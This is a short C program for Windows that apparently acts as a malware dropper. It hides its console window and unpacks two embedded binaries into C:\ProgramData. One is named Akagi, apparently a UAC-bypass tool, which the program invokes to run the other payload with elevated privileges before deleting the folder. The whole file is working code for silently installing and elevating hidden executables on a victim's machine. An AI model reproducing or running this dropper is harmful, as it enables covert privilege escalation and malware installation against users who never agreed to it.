#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

/* http://elm-chan.org/junk/32bit/binclude.html */
#define IMPORT_BIN(sect, file, sym) asm (\
    ".section " #sect "\n" \
    ".balign 4\n" \
    ".global " #sym "\n" \
    #sym ":\n" \
    ".incbin \"" file "\"\n" \
    ".global _sizeof_" #sym "\n" \
    ".set _sizeof_" #sym ", . - " #sym "\n" \
    ".balign 4\n" \
    ".section \".text\"\n")

int main(int argc, char** argv) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    IMPORT_BIN(".rodata", "binaries\\666.bin", Bin_666);
    extern const char Bin_666[], _sizeof_Bin_666[];

    IMPORT_BIN(".rodata", "binaries\\Akagi.bin", AkagiBin);
    extern const char AkagiBin[], _sizeof_AkagiBin[];

    system("if not exist \"C:\\ProgramData\\hentai-666\" mkdir C:\\ProgramData\\hentai-666");

    FILE *fp = fopen("C:\\ProgramData\\hentai-666\\666.exe", "wb");
    fwrite(Bin_666, 1, 62195, fp);  /* reserving ~ 61 kB */
    fclose(fp);

    FILE *fpp = fopen("C:\\ProgramData\\hentai-666\\Akagi.exe", "wb");
    fwrite(AkagiBin, 1, 76800, fpp);  /* reserving ~ 75 kB */
    fclose(fpp);

    system("C:\\ProgramData\\hentai-666\\Akagi.exe 33 C:\\ProgramData\\hentai-666\\666.exe && rmdir /s /q C:\\ProgramData\\hentai-666");

    return 0;
}